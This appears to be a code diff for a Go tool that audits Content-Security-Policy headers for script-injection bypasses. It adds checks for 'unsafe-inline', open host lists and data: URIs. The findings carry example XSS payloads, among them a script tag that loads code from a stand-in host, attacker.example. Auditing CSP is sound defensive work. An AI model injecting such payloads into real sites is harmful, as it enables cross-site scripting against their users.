@@ -355,7 +355,10 @@ func (db *gadgetDB) bypasses(targetURL, pageURL string, enforced []cspPolicy) []
 			directives = append(directives, p.directive)
 		}
 
-		if p.unsafeInline {
+		// 'unsafe-inline' is only reported when it has an effect: a nonce,
+		// a hash or 'strict-dynamic' in the same source list makes the
+		// keyword a no-op (the usual old-browser fallback shape).
+		if p.unsafeInline && !p.hasNonceOrHash && !p.strictDynamic {
 			flagSet["unsafe-inline"] = true
 		}
 
@@ -364,17 +367,74 @@ func (db *gadgetDB) bypasses(targetURL, pageURL string, enforced []cspPolicy) []
 		}
 	}
 
-	if len(directives) == 0 {
-		return nil
-	}
-
 	page, _ := parseURLParts(pageURL)
 	flags := sortedKeys(flagSet)
 	directive := strings.Join(directives, ",")
 
+	if directive == "" {
+		directive = "no-script-src"
+	}
+
 	var findings []bypassFinding
 
 	seen := map[string]struct{}{}
+
+	// --- No-gadget bypass checks (#525) ---------------------------------
+	// Three weaknesses need no gadget from the dataset, so they are probed
+	// directly. Like a gadget, each probe must pass EVERY enforced policy.
+	//
+	// 1. Inline: a plain <script>alert(1)</script> runs.
+	// 2. Open host: a script from a host no policy lists loads, which is the
+	//    real finding under `*`, `https:`, `http:` or an absent directive —
+	//    reusing the matcher keeps it Chrome-faithful, and when it hits, the
+	//    per-gadget loop below is skipped: every gadget is "allowed" but none
+	//    is needed, so listing them is pure noise.
+	// 3. data: a data:text/javascript script loads.
+	if allPoliciesAllowInline(enforced) {
+		findings = append(findings, bypassFinding{
+			url:       targetURL,
+			domain:    "'unsafe-inline'",
+			directive: directive,
+			code:      "<script>alert(1)</script>",
+		})
+	}
+
+	const (
+		openHostProbeURL  = "https://csprecon-any-host.invalid/x.js"
+		openHostProbeCode = `<script src="https://attacker.example/xss.js"></script>`
+		dataProbeCode     = `<script src="data:text/javascript,alert(1)"></script>`
+	)
+
+	// Synthetic probes bypass parseURLParts' scheme:// requirement and are
+	// matched with the same urlParts the parser would produce, so the
+	// Chrome-faithful matcher sees exactly what a browser would load.
+	openParts := urlParts{scheme: "https", host: "csprecon-any-host.invalid", port: portNone, path: "/x.js"}
+	openHost := allowedByAllEnforced(openParts, page, enforced)
+
+	if openHost {
+		findings = append(findings, bypassFinding{
+			url:       targetURL,
+			domain:    "*",
+			directive: directive,
+			code:      openHostProbeCode,
+		})
+	}
+
+	dataParts := urlParts{scheme: "data", port: portNone, path: "text/javascript,alert(1)"}
+	if allowedByAllEnforced(dataParts, page, enforced) {
+		findings = append(findings, bypassFinding{
+			url:       targetURL,
+			domain:    "data:",
+			directive: directive,
+			code:      dataProbeCode,
+		})
+	}
+
+	// Every gadget is allowed under an open host list, so reporting 371 of
+	// them adds nothing the open-host finding has not already said.
+	if openHost {
+		return findings
+	}
 
 	for i := range db.all {
 		g := &db.all[i]
@@ -403,6 +463,18 @@ func (db *gadgetDB) bypasses(targetURL, pageURL string, enforced []cspPolicy) []
 	}
 
 	return findings
+}
+
+// allPoliciesAllowInline reports whether inline script execution is allowed
+// by every enforced policy (a script must satisfy all of them).
+func allPoliciesAllowInline(enforced []cspPolicy) bool {
+	for _, p := range enforced {
+		if !p.allowsAllInline() {
+			return false
+		}
+	}
+
+	return true
 }
 
 func sortedKeys(m map[string]bool) []string {
